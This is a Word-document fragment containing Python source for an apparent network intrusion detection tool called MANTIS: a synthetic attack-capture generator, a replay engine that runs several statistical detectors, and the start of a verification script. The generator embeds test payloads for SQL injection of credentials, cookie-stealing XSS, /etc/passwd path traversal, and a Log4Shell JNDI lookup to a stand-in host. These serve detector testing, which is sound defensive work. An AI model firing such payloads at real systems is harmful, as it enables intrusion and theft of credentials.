      </w:r>
    </w:p>
    <w:p w14:paraId="3DFA8A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phase 3  sustained SYN flood    -&gt; Z-Score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FAEBF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phase 4  SQLi + XSS payloads    -&gt; Naive Bayes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE992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phase 5  known-bad source IP    -&gt; Bloom Filter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A1ED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5312EC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base_ts = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1817DC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phases = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667B67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writer = pcap.PcapWriter(path, snaplen=200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="273F29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2D47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emit(frame, second, index, per_second):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D21B7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writer.write(frame, ts=base_ts + second + (index / float(per_second)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617CB1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orig_len=len(frame))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07B752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E47F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phase 1: 15 seconds of ordinary browsing, ~10 pps over a few ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0C33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second in range(0, 15):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5221EE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range(10):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC5B0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port = [80, 443, 53, 22][i % 4]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D079E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emit(parser_mod.build_tcp(sport=40000 + i, dport=port,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786516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flags=0x18, data=b"GET /index.html HTTP/1.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="591E78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src="192.168.1.50"), second, i, 10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0109AA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phases.append(("baseline browsing", "0-14s", "no alert expected"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD21B7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74C1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phase 2: horizontal port scan, 200 distinct destination ports per second</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2AA1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second in range(15, 20):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1189D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range(200):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1B35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emit(parser_mod.build_tcp(sport=50000, dport=1 + i, flags=0x02,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D082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src="192.168.1.66"), second, i, 200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371EFB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phases.append(("port scan", "15-19s", "KNN -&gt; Scan"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB085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F316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phase 3: SYN flood at 1500 pps against a single port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28BD7F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second in range(20, 28):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D3F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range(1500):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="467D49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emit(parser_mod.build_tcp(sport=1024 + (i % 60000), dport=80,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F802B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flags=0x02, src="192.168.1.99"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030208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second, i, 1500)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001AFB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phases.append(("SYN flood", "20-27s", "Z-Score -&gt; DDoS"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2633ED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380A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phase 4: web application payloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E05D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payloads = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="514863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/?id=1 UNION SELECT username,password FROM users -- HTTP/1.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612F81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/?q=&lt;svg onerror=alert(document.cookie)&gt; HTTP/1.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="767E46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/?file=../../../etc/passwd HTTP/1.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656447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b"POST /api {\"x\":\"${jndi:ldap://evil.example/a}\"} HTTP/1.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530811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7782F5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i, payload in enumerate(payloads):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760EC2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emit(parser_mod.build_tcp(sport=41000 + i, dport=80, flags=0x18,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F390F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data=payload, src="192.168.1.77"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0240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28, i, len(payloads))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="606601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phases.append(("web payloads", "28s", "Naive Bayes -&gt; Malicious"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="445D19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AA46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phase 5: traffic from a blacklisted source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195B09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 in range(5):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5490DC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emit(parser_mod.build_tcp(sport=6000 + i, dport=445, flags=0x02,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545B2E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src=blacklist_ip), 29, i, 5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4923CA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phases.append(("known-bad IP", "29s", "Bloom Filter -&gt; Blacklisted"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D140E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8FC9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writer.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783D28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print("[+] wrote %s (%d packets, opens in Wireshark)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D38E9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(path, writer.count))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B6895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    phase                 window     expected detection")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="262C83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  " + "-" * 58)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14AA63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name, window, expected in phases:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B251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 %-21s %-10s %s" % (name, window, expected))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EDC6C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writer.count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293603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2980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3F44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--------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1542A1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replay</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383831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--------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EDE9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ReplayEngine:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B4850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"""Runs the full engine ensemble over decoded packets, second by second."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="403512E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237A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config=CONFIG, blacklist=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F1851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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02EAB2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self.parser = parser_mod.PacketParser()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C5EA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C76C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self.stats_engine = z_score.MinimalistStats(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A5A9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window_size=config.zscore_window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7253CB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threshold=config.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B449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min_pps=config.ddos_min_pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0669CC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required_consecutive=config.ddos_consecutive_intervals)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D063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self.knn_engine = knn.KNNMonitor(k=config.knn_k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C97F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self.payload_engine = naive_bayes.PayloadMonitor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD5FC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self.kmeans_engine = kmeans.KMeansMonitor(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783B34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k=config.kmeans_k, learning_rate=config.kmeans_alpha)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="124A0E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self.blacklist = bloom.BloomFilter(size=config.bloom_size,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E0BDA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hash_count=config.bloom_hashes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D119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(blacklist or ["192.168.1.200", "10.0.0.66"]):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BDAB0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self.blacklist.add(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FAAFC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AA60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 = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C52D6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self.scan_active_sources = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710C17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self.counts = {"packets": 0, "TCP": 0, "UDP": 0, "ICMP": 0, "OTHER": 0}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E93F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self.engine_hits = {"z_score": 0, "knn": 0, "naive_bayes": 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3F71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"kmeans": 0, "bloom": 0}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE10A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6AA5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_alert(self, second, engine, message, confidence=None, src=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086ADA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 = mitre.enrich(message, confidence)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066020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self.engine_hits[engine] = self.engine_hits.get(engine, 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D86E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self.alerts.append({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A0317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"t": round(second, 3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B32C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"engine": engine,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BCFE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"src": src,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22DE9E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"message": message,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51800A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"technique_id": meta["technique_id"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382D0C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"tactic": meta["tactic"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335423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"severity": meta["severity"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD27C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"risk_score": meta["risk_score"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EEFB0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})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4030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887D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run(self, path, verbose=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005632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 = pcap.PcapReader(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D169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first_ts = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDBA1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current_second = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD508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packet_count = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B4DE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unique_ports = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65CCF0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source_stats = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0223B8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6773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ts, raw, _orig_len in reader:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ED48A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first_ts is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC7B2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first_ts = ts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1BAE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rel = ts - first_ts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2301C4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second = int(rel)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15DC73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4A27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---- second boundary: run the per-interval engines ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48EC01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current_second is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210646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current_second = second</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D499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while second &gt; current_second:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1853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self._close_second(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434BCE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current_second, packet_count, unique_ports, source_stats)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E40CD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packet_count = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2726B0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unique_ports = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12401D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source_stats = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B9DD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current_second += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3561EB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9E0F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 = self.parser.parse(raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B7F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if pkt is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574956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337F695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F9D5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self.counts["packets"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40814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self.counts[pkt["proto"]] = self.counts.get(pkt["proto"], 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B7877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packet_count += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="177EF0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source_observation = source_stats.setdefault(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE8AA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pkt["src"], {"packets": 0, "ports": set()})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E9D1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source_observation["packets"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5015E2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93B7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Bloom reputation check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E68A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self.blacklist.check(pkt["src"]):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="526295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verdict = self.blacklist.analyse(pkt["src"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1A48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self._alert(rel, "bloom",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A61B3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"BLACKLISTED IP DETECTED: %s (Flagged)" % pkt["src"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0142C6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verdict.confidence, pkt["src"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D0A0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53A1916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54A2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pkt["dport"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DD2A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unique_ports.add(pkt["dport"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC681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source_observation["ports"].add(pkt["dport"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66714C0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7ED1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Naive Bayes payload inspection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="532CB3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pkt["payload"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E46A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verdict = self.payload_engine.analyse(pkt["payload"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E1EC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verdict.is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4736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self._alert(rel, "naive_bayes",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="261193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"MALICIOUS PAYLOAD! Confidence: %.2f%% Keywords: %s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4FE6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% (verdict.confidence * 100,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="134102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verdict.detail["keywords"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400281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verdict.confidence, pkt["src"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2D9A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82A7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reader.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326AFE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current_second is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DAC3E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self._close_second(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DDE8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current_second, packet_count, unique_ports, source_stats)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531F3E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self.report(verbose=verbose)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70C0333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78E3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_close_second(self, second, packet_count, unique_ports, source_stats):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B6B3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"""Run the interval engines for one completed second."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C153F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packet_count == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4625F4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3918E1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 = len(unique_ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A8124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dominant_src = self._dominant_source(source_stats, packet_count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17706B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CDB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zv = self.stats_engine.analyse(packet_count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44AC99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zv.detail["new_threat"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C8009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self._alert(second, "z_score",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46FAAC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"DDoS DETECTED! Z-Score: %.2f (PPS: %d)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A856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% (zv.detail["z_score"], packet_count), zv.confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A1ABB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dominant_src)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E933B7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5C81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current_scan_sources = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F3D7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src, observation in source_stats.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A2D8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src_ports = len(observation["ports"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37624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kv = self.knn_engine.analyse(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50FAB3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src_ports, observation["packets"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CCF9D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kv.is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03DC16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current_scan_sources.add(src)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4F2C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src not in self.scan_active_sources:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="515A10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self._alert(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0745F1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second, "knn",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21427E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"PORT SCAN DETECTED! (Unique Ports: %d/sec)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF8FA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% src_ports,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009ED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kv.confidence, src)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681E97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self.scan_active_sources = current_scan_sources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7894F3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48F3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cv = self.kmeans_engine.analyse(packet_count, ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB16E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cv.is_threat and not current_scan_sources and not zv.is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DF92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self._alert(second, "kmeans",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130E8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"ANOMALY DETECTED (Cluster %d)! Suspicious activity."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EDC9F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% cv.detail["cluster"], cv.confidence, dominant_src)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D3DD4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DC31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_dominant_source(self, source_stats, total_packets):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C67A7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source_stats or total_packets &lt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9B63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274689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src, observation = max(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581456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source_stats.items(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F34FC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key=lambda item: item[1].get("packets", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB71A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share = observation.get("packets", 0) / float(total_packets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618DEE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threshold = max(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D08F4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0.0, min(1.0, float(getattr(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B95D4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self.config, "source_attribution_min_share", 0.50))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DFA00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src if share &gt;= threshold else None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE162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394FE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report(self, verbose=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="360066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summary = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="487590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"packets": self.counts["packets"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61420F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"protocols": {k: v for k, v in self.counts.items()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5D40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if k != "packets"},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8888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"parser": self.parser.stats(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D7E6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"engine_hits": self.engine_hits,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB210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"alerts": self.alerts,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D391F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38866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verbose:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52C302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summary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E33063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8337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print("\n" + "=" * 66)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F959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MANTIS Offline Replay Report")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F035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print("=" * 66)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5451A7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packets decoded : %d" % self.counts["packets"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B81A0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protocol mix    : TCP=%d UDP=%d ICMP=%d OTHER=%d"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17064A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(self.counts.get("TCP", 0), self.counts.get("UDP", 0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="676524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self.counts.get("ICMP", 0), self.counts.get("OTHER", 0)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3578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parser drops    : non-IPv4=%d malformed=%d"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546CC1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(self.parser.dropped_non_ipv4, self.parser.dropped_malformed))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B41E4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  engine detections")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59ED77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" + "-" * 62)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05FD9B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labels = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D30F2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"z_score": "Z-Score       (volumetric flood)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D2D5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"knn": "KNN           (port scan)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="785F70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"naive_bayes": "Naive Bayes   (payload)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="006CF1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"kmeans": "K-Means       (behavioural drift)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E7277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"bloom": "Bloom Filter  (reputation)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="384F4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42977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key, label in labels.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E587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hits = self.engine_hits.get(key, 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617CE0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mark = "FIRED" if hits else "  -  "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECD3D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[%s] %-34s %5d alerts" % (mark, label, hits))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72AF302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D7D4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self.alerts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F6E4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print("\n  alert timeline (first 15)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B784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" + "-" * 62)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68529B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%-7s %-12s %-9s %-6s %s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="442FEB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("t(s)", "technique", "severity", "risk", "detail"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6D5A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a in self.alerts[:15]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67232F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  %-7.2f %-12s %-9s %-6.1f %s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BEA0E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% (a["t"], a["technique_id"], a["severity"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2B72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a["risk_score"], a["message"][:44]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36CCEE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len(self.alerts) &gt; 15:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED47E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  ... %d more alerts" % (len(self.alerts) - 15))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="690D72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print("=" * 66)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43DCE1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summary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BCD16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E077B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5D26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parse_args(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A974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argparse.ArgumentParser(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E95E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prog="mantis-replay",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D0AD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description="replay a pcap through the MANTIS detection engines")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D9B72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p.add_argument("--pcap", help="capture file to replay")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7B71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p.add_argument("--generate", metavar="FILE",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DCB4E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help="write a synthetic attack-scenario capture and exit")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9BC9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p.add_argument("--out-json", help="write the replay report as JSON")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127E92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p.add_argument("--quiet", action="store_true")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD3CB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p.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04348F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6C53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C0AD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main(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD6C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args = parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E1FFD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4567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args.generate:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8EAB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generate_scenario(args.generate)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="756831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0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394FE2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B62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args.pcap:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F220A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give --pcap FILE or --generate FILE (see --help)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27FC12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2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C5AB5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os.path.isfile(args.pcap):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F036F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no such capture:", args.pcap)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11CE6A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2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D66C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1164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engine = ReplayEngine()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4541D0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started = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EFCD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summary = engine.run(args.pcap, verbose=not args.quiet)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A3C2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elapsed = time.time() - started</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F785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summary["replay_seconds"] = round(elapsed, 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16875E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summary["packets"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622EA5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summary["packets_per_second"] = int(summary["packets"] / max(elapsed, 1e-9))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32902E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args.quiet:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6061B3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replayed %d packets in %.2fs (%d pkt/s decode rate)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F40E3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(summary["packets"], elapsed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1755C3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summary["packets_per_second"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50298D3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1A49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args.out_json:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C8C00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open(args.out_json, "w", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E9C5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json.dump(summary, f, indent=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604FE7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print("[+] wrote", args.out_json)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747C07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553C62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AB2E8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24DF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39E8E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54C2724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src/verify.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A5E9C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(109 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="720639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engines.z_score as z_score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73DF9F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engines.knn as knn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F6E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engines.naive_bayes as naive_bayes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6A31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engines.bloom as bloom</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0330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470F5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3C94CBD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5DE0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Verification Script</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3376F1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RUN THIS ON WINDOWS/LINUX TO TEST LOGIC (Without needing Raw Sockets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7509DE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B36E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test_engines():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB43C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print("================================================================")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2976D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 MANTIS ENGINE VERIFICATION (Windows Compatible Mode)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5053E9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print("================================================================")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3253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2BBE35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3B0FBC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TEST 1: Statistical Engine (Z-Score)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65C1C8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562BA3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print("\n[TEST 1] Testing Z-Score Engine (DDoS Detection)...")</w:t>
